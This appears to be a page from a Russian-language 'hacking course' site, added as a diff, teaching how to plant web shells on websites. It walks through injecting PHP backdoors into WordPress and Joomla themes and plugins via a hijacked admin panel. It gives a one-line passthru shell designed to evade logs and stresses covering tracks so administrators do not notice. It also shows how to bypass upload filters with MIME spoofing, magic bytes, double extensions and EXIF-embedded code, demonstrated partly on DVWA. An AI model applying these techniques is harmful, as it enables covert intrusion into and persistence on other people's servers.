@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <link rel="shortcut icon" href="source/favicon.ico" type="image/x-icon">
+    <title>Уроки | University 2.0</title>
+    <link rel="stylesheet" href="source/main.css">
+    <link rel="stylesheet" href="source/style.css">
+
+    <link rel="stylesheet" href="source/tikets.css">
+    <link rel="stylesheet" href="source/profile_window.css">
+
+    <link rel='stylesheet' href="source/default.css">
+    <link rel='stylesheet' href="source/idea.css">
+    <script type="text/javascript" src="source/highlight.pack.js"></script>
+</head>
+<body>
+
+
+    <div id="myfond_gris" opendiv=""></div>
+    <div align="center" style="padding-top:35px;">
+        <div id="box_1" class="mymagicoverbox_fenetre" style="left:-225px; width:450px;">
+            Anon | 00500
+            <div class="mymagicoverbox_fenetreinterieur" style="height:220px; ">
+                <div align="left">
+                    <p class="lead">Имя пользователя: Anon</p>
+                    <p class="lead">Статус: Активен</p>
+                    <p class="lead">Регистрация jabber: <a target="_blank" href="http://plast.cash/registration.php?key="></a></p>
+                    <p class="lead">Поток: Anon</p>
+                    <p class="lead">TG канал: <a target="_blank" href="">Канал для опретивных оповещений</a></p>
+                    
+                    <br><br>
+                    <div style="width:100px" align="center" class="mymagicoverbox_fermer">Закрыть</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+
+<div class="main_container">
+    <header>
+        <a href="index.html"><img class="logo" src="source/logo.png" alt="University 2.0"></a>
+        <div class="header_right">
+            <div class="user_info">
+                <p>Hello,
+                <a href="#" iddiv="box_1" class="mymagicoverbox"> Anon </a>
+
+
+                </p>
+                <p>ID: 00500</p>
+            </div>
+            <div class="user_actions">
+                <a href="help.html"
+                   class="btn btn_gray btn_transparent btn_border_transparent btn_icon btn_icon_help">Помощь</a>
+                
+                    
+                    <a href="index.html" class="btn  btn_round btn_status btn_status_active btn_gray btn_exit">Выход</a>
+                
+            </div>
+        </div>
+    </header>
+    <div class="container">
+        <nav>
+            <a href="index.html" class="btn btn_icon btn_icon_dashboard ">Сводка</a>
+            <a href="lections.html" class="btn btn_icon btn_icon_book active">Лекции</a>
+            <a href="index.html" class="btn btn_icon btn_icon_group ">Тикеты</a>
+            <a href="faq.html" class="btn btn_icon btn_icon_chat ">FAQ</a>
+        </nav>
+        <div class="content">
+
+<a href="hack.html">       
+    <div class="banner_block" style="background-image:url('source/hack_9X2ouwy.jpg')">
+        <div class="banner_content">
+            <h2>Хак</h2>
+            <p>Лучшая защита - это нападение.</p>
+        </div>
+    </div>
+    </a>
+    <br>
+
+            
+
+            
+    <div class="article_actions">
+        <a href="hack.html" class="btn btn_round btn_gray  btn_icon btn_icon_back ">Назад</a>
+    </div>
+
+<div class="text_content">
+        <p>Вся наша работа сводится к получению возможности выполнять системные команды. И нужно это для того чтобы залить свой веб шелл или бекдор на сервер. Веб шеллами называют бекдоры для сайтов - это такая страница на сайте к которой ты всегда можешь получить доступ минуя авторизацию на сайте. Более подробно это будет рассмотрено позже. А сейчас я буду говорить про формы загрузки файлов и веб шелла в частности.</p>
+
+<h3><strong>WordPress</strong></h3>
+
+<p>Представим ситуацию когда ты смог получить доступ к админке. Если на сервере используется распространенная CMS (Content Menegment System), то пролить шелл можно через редактирование кода сайта прямо из админки. Такие CMS как Joomla, WordPress, Drupal и подобные позволяют это делать. Описывать тут особо нечего, хотя я все равно расспишу процедуру пошагово.</p>
+
+<p>Например мы имеем доступ к админке с WP. Тогда нужно перейти в разлел внешнего вида.</p>
+
+<p><a href="source/wp1.png"><img alt="" src="source/wp1.png" style="height:400px; width:100%" /></a></p>
+
+<p>Далее переходим, в подменю редактор.</p>
+
+<p><a href="source/wp2.png"><img alt="" src="source/wp2.png" style="height:400px; width:100%" /></a></p>
+
+<p>В данном подменю, попав в редактор нам необходимо выбрать тему, которая не используется. И перейти к редактированию страницы 404 (шаблон ошибки). <span style="background-color:#f1c40f">Дабы не палится</span>, все <span style="background-color:null"><span style="background-color:#f1c40f">делаем быстро и аккуратно</span><span style="color:null">,</span></span> при этом все <span style="background-color:#f1c40f">изменения</span> в шаблонах нужно обязательно <span style="background-color:#f1c40f">сохранять</span>, так как позже тебе нужно будет <span style="background-color:#f1c40f">вернуть все так как было</span> до твоего появления иначе админу не понравится такая наглость.</p>
+
+<ol>
+    <li>Сохраняем код страницы себе. Не важно куда, в блокнот можешь сохранить.</li>
+    <li>Затем вставляем вместо кода шаблона код веб шелла. Например <a href="https://github.com/tennc/webshell/tree/master/php/wso" target="_blank">WSO</a>.</li>
+    <li>Сохраняешь.</li>
+    <li>Переходишь напрямую на страницу редактируемого шаблона, чтобы проверить работу.</li>
+</ol>
+
+<p>Чтобы разобраться куда перейти, рассмотрим структуру сайта WP.</p>
+
+<p><a href="source/wp3.png"><img alt="" src="source/wp3.png" style="height:400px; width:100%" /></a></p>
+
+<ul>
+    <li>wp-admin - Тут находятся файлы админки такие как CSS,&nbsp; JavaScript, и PHP. Они обеспечивают функциональность консоли и административной части сайта.</li>
+    <li>wp-content - Содержит пользовательские данные:
+    <ul>
+        <li>languages - Файлы языковых пакетов.</li>
+        <li>plugins - Файлы установленных плагинов.</li>
+        <li>themes - Файлы тем.</li>
+        <li>uploads - Загруженные файлы.</li>
+    </ul>
+    </li>
+</ul>
+
+<p>Нас интересует папка с темами, значит запрос для перехода к нажему шеллу будет выглядеть примерно так.</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>http://сайт.ru/wp-content/themes/название_темы/404.php</tt></div>
+
+<p>Желательно заранее подготовиться и знать названия папок стандартных тем, а если в админке ее нет, то можно быстро ее поставить и начать с первого пункта.</p>
+
+<p><a href="source/wpthemes.png"><img alt="" src="source/wpthemes.png" style="height:400px; width:100%" /></a><br />
+<a href="source/wp4.png"><img alt="" src="source/wp4.png" style="height:400px; width:100%" /></a></p>
+
+<p>Если все же возникли сложности с нахождением папки с темой, можем залить код шелла таким же образом в активную тему, проделов все теже манипуляции. Затем вбить несуществоющий адрес, чтоб попасть на страницу ошибки, где лежит наш шелл.</p>
+
+<p>Есть одна маленькая хитрость, чтобы процедура случайно не спалилась, можно просунуть однострочный шелл, например</p>
+
+<div>
+<pre>
+<code class="language-php">&lt;?php
+    if (isset($_POST['x'])) {
+        echo passthru($_POST['x']);
+        die;
+    }
+?&gt;</code></pre>
+</div>
+
+<p>Первое и самое важное - параметр получается из POST, такой подход не спалит закладку в логах, так как пост параметры там не отображаются. Второе - само условие можно сунуть куда угодно просто добавив его к существующему коду. И вот уже через такую закладку можно загрузить полноценный шелл, куда нужно и затем, обязательно, венуть код шаблона в прежний вид или удалить шаблон который был установлен.</p>
+
+<p>Вариант второй, залить шелл код в плагины. Для этого делаем практически тоже самое, переходим в раздел plugins</p>
+
+<p><a href="source/wp5.png"><img alt="" src="source/wp5.png" style="height:400px; width:100%" /></a></p>
+
+<p>Так же необходимо знать название папок основных плагинов или посмотреть относительный путь справа в браузере.</p>
+
+<p><a href="source/wp6.png"><img alt="" src="source/wp6.png" style="height:400px; width:100%" /></a></p>
+
+<p>и наш шелл будет по адресу</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>http://сайт.ru/wp-content/plugins/akismet/akismet.php</tt></div>
+
+<p>Иногда для доступа потребуется активировать плагин в меню плагинов.</p>
+
+<p><a href="source/wp7.png"><img alt="" src="source/wp7.png" style="height:400px; width:100%" /></a></p>
+
+<p>Самое главное, после всего этого залить шел как отдельный скрипт и вернуть всё назад как было до нашего появления!</p>
+
+<h3><strong>Joomla</strong></h3>
+
+<p>Различия между заливкой&nbsp; шелл кода в вордпрес и джумла можно сказать нет, за исключением расположения меню. И так попав в админ панель, необходимо перейти в меню Extensions и выбрать Templates.</p>
+
+<p><a href="source/joomla1.png"><img alt="" src="source/joomla1.png" style="height:400px; width:100%" /></a></p>
+
+<p>Далее переходим в редактор тем,</p>
+
+<p><a href="source/joomla2.png"><img alt="" src="source/joomla2.png" style="height:400px; width:100%" /></a></p>
+
+<p>Выбираем тему которую использует сайт. <strong>Ни вкоем случае не админ панель</strong>!</p>
+
+<p><a href="source/joomla3.png"><img alt="" src="source/joomla3.png" style="height:400px; width:100%" /></a></p>
+
+<p>И затем переходим в редактирование какого либо файла php. Так же сохраняеем себе в текстовик данный код изменяемого файла, чтобы вернуть всё назад. Смотрим имя папки данной темы, а так же имя самого редактируемого файла. Все указано на скрине.</p>
+
+<p><a href="source/joomla4.png"><img alt="" src="source/joomla4.png" style="height:400px; width:100%" /></a></p>
+
+<p>Заменяем код на наш шелл и сохраняем изменения.</p>
+
+<p><a href="source/joomla5.png"><img alt="" src="source/joomla5.png" style="height:400px; width:100%" /></a></p>
+
+<p>Затем в поисковую строку вбиваем путь до нашего веб шелла, в данном случае он выглядит так:</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>http://сайт/templates/тема/error.php</tt></div>
+
+<p><a href="source/joomla6.png"><img alt="" src="source/joomla6.png" style="height:400px; width:100%" /></a></p>
+
+<p>После входа в шелл, сразу заливаем новый файл с шеллом, запоминаем к нему путьи переходим через адресную строку на новозалитый шел. После чего возвращаемся в редактор темы и возвращаем все назад.</p>
+
+<h3><strong>Плагины</strong></h3>
+
+<p>Как ты понял процедура идентичная. Если движек предоставляет тебе возможность правки php кода, конечно же. Если такой функциональности нет, то тебе потребуется доступ к форме загрузки файлов. Редкий двиг такого не предоставляет. Например как возможность установки плагинов. Форма устновки плагина дает тебе возможность выбрать файл плагина на своем компе, а значит форма эта будет грузить файл плагина (это обычно архив) на сайт, а процедура установки - это просто распаковка файлов архива в нужные места.</p>
+
+<blockquote>
+<p>Кстати на днях обнародовали уязвимость в архиваторах, специальным образом упакованный файл, содержащий в пути выход из директории &quot;../../&quot; может распаковаться куда угодно. Странно, что об этом раньше не подумали :-)</p>
+</blockquote>
+
+<p>У нас суть в том, что файл так или иначе будет загружен на сервер и ничто тебе не мешает загрузить php код. Движек положит пхп файл в uploads/yead/mounth/day, откуда ты можешь его запустить и все.</p>
+
+<h3><strong>Форма загрзуки файлов</strong></h3>
+
+<p>А что делать если у тебя есть только форма загрузки файлов, например форма загрузки картинки для товара в магазине? Тогда придется подумать. Давай я тебе покажу как это можно сделать. Открой сайт DVWA и бурп. Выставлять сложность в Low тут нет смысла, так как этот уровень позволит тебе загрузить любой файл, поэтому сразу переходи на Medium. Затем прейди в &quot;File Uploads&quot;. Посмотрим на исходник.</p>
+
+<div>
+<pre>
+<code class="language-php">&lt;?php
+
+if( isset( $_POST[ 'Upload' ] ) ) {
+    // Where are we going to be writing to?
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
+    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
+
+    // File information
+    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];
+    $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
+    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];
+
+    // Is it an image?
+    if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &amp;&amp;
+        ( $uploaded_size &lt; 100000 ) ) {
+
+        // Can we move the file to the upload folder?
+        if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
+            // No
+            echo '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;';
+        }
+        else {
+            // Yes!
+            echo "&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;";
+        }
+    }
+    else {
+        // Invalid file
+        echo '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;';
+    }
+}
+
+?&gt; </code></pre>
+</div>
+
+<p>Под коментом &quot;// Is it an image?&quot; идет проверка загружаемого файла по <a href="https://en.wikipedia.org/wiki/Media_type" target="_blank">MIME типу</a> (есть еще в email такое понятие как <a href="https://en.wikipedia.org/wiki/MIME" target="_blank">MIME</a>, суть одна и таже), который получается из Content-Type пост запроса. Сейчас ты увидишь разницу в типах содержимого пост запроса. И еще есть проверка на макимальный вес, не более 100Kb (в коде и запросе он в байтах).</p>
+
+<p>Теперь нужно сделать файл который будем загружать. Открывай текстовый редактор и вписывай в него код php шелла и сохрани как name.png. Далее в бурпе надо включить Intercepter на во вкладке Proxy. В браузере выбираешь картинку и сабмитишь форму. Бурп перехватывает запрос и фризит его, предоставляя возможность тебе его отредактировать.</p>
+
+<p><a href="source/upload1.png"><img alt="" src="source/upload1.png" style="height:400px; width:100%" /></a></p>
+
+<p>В запросе тебе нужно поменять значение filename на name.php и нажать Forward. Теперь лучше выключить интерспетер чтобы не морозил. А сервер нам ответил:</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>../../hackable/uploads/shell.php succesfully uploaded!</tt></div>
+
+<p>Отлично. Тривиальный пример на самом деле, так что давай повысим сложность до Higth и посмотрим код проверки:</p>
+
+<div>
+<pre>
+<code class="language-php">if( 
+    ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower($uploaded_ext ) == "png" ) &amp;&amp; 
+    ( $uploaded_size &lt; 100000 ) &amp;&amp; 
+    getimagesize( $uploaded_tmp ) 
+) { </code></pre>
+</div>
+
+<p>Тут все гораздо жесче. Сначала проверяется расширение файла (оно, сука, получается продумано), далее проверяется размер файла и в конце проверяется сигнатура файла. Как тут ни старайся, проверку расширения обмануть не получится. У меня получилось только залить файл без расширения, вот только исполняться он, ясен пень, не захотел. Давай оставим эту проверку на потом, так как у нас есть еще одна серьезная проблема - проверка сигнатуры.</p>
+
+<p>getimagesize(FILENAME) читает начальную последовательность байт из файла, по которым он определяет картинка это или нет. Чтобы понять о чем я, можешь установить себе HEX редактор, например Ghex:</p>
+
+<div style="background:#eeeeee; border:1px solid #cccccc; padding:5px 10px"><tt>apt install ghex</tt></div>
+
+<p>И открыть через него, например PNG файл.</p>
+
+<p><a href="source/png_hex.png"><img alt="" src="source/png_hex.png" style="height:400px; width:100%" /></a></p>
+
+<p>Я выделил те байты, которые указывают, что этот файл является PNG файлом. Можешь свериться с <a href="https://en.wikipedia.org/wiki/List_of_file_signatures" target="_blank">этой таблицей</a>. Наша задача вписать в код своего шелла эту сигнатуру. Я на самом деле не знаю метода проще, чем через программирование. Начнем <s>душить питона</s> учить пайтон? На самом деле тут все просто, интерпретатор пайтона выступит лишь конвертером HEX`а в юникод.</p>
+
+<p><a href="source/write_hex.png"><img alt="" src="source/write_hex.png" style="height:400px; width:100%" /></a></p>
+
+<p>Вот так все просто, открываем файл на запись (если он есть то произойдет перезапись), импортируем библиотеку для конвертации BIN в ASCII и пишем в файл HEX код по 2 символа, а в конце вставляем наш однострочный шелл (не забывай про букву b перед ковычками при запиши шелла). Теперь можно сменить расширение файла на php и открыть текстовым редактором, если интересно. Главное ничего туда не дописывать, чтобы ничего не сломать. Этот файл обойдет проверку сигнатуры.</p>
+
+<p>А что же делать с расширением? Тут 2 пути, первый можно залить файл с двойным расширением (или вообще попробовать поиздеваться над сервером фазинг листами), второй загрузить файл с расширением png и открыть его эксплуатируя LFI.</p>
+
+<p>Начнем с двойного расширения. Почему это может сработать? На сервере может лежать файл .htaccess&nbsp; в котором задается Handler для файла, говорящий веб серверу как воспринимать файлы подходящие под маску FileMatch. Обычно там пишут регулярки и тут можно допустить ошибку. Например, как в нашем случае, забыть про $ означающий символ конца ввода данных, что приведет к выполнению файлов с расширение &quot;.php.png&quot; и подобных как php. Тупая, конечно, ошибка, тем не менее имеет место быть.</p>
+
+<p><a href="source/php_png_1.png"><img alt="" src="source/php_png_1.png" style="height:400px; width:100%" /></a></p>
+
+<p style="text-align:center"><span style="color:#999999">Да, в скрине я прогружал другой шелл, который берет парметр из GET и это не имеет никакого значения</span></p>
+
+<p>С LFI все даже проще, так как при эксплуатации в паре с этой уязвимостью, ты можешь просто вписать код шелла в EXIF изображения. Вот пример через Gimp.</p>
+
+<p>Открываем картинку.</p>
+
+<p><a href="source/gimp1.png"><img alt="" src="source/gimp1.png" style="height:400px; width:100%" /></a></p>
+
+<p>Открываем ее свойства.</p>
+
+<p><a href="source/gimp2.png"><img alt="" src="source/gimp2.png" style="height:400px; width:100%" /></a></p>
+
+<p>Вписываем код PHP шелла в коментарии.</p>
+
+<p><a href="source/gimp3.png"><img alt="" src="source/gimp3.png" style="height:400px; width:100%" /></a></p>
+
+<p>Сохраняем, экспортируем &lt;<tt>Ctrl+Shift+E</tt>&gt; и грузим на сервер. А потом открываем через LFI.</p>
+
+<p><a href="source/gimp5.png"><img alt="" src="source/gimp5.png" style="height:400px; width:100%" /></a></p>
+
+<p>Вот таким образом можно обмануть защиты на загрузку файлов. Непременно есть непробиваемые, во всяком случае пока что, защиты. Хороший пример можешь посмотреть в исходнике PHP кода для уровня Imposible, а как он работает написано в Help на странице File Upload.</p>
+    </div>
+    <br>
+ 
+ 
+        </div>
+    </div>
+</div>
+<footer>
+    <p>University 2.0</p>
+</footer>
+
+</body>
+</html>
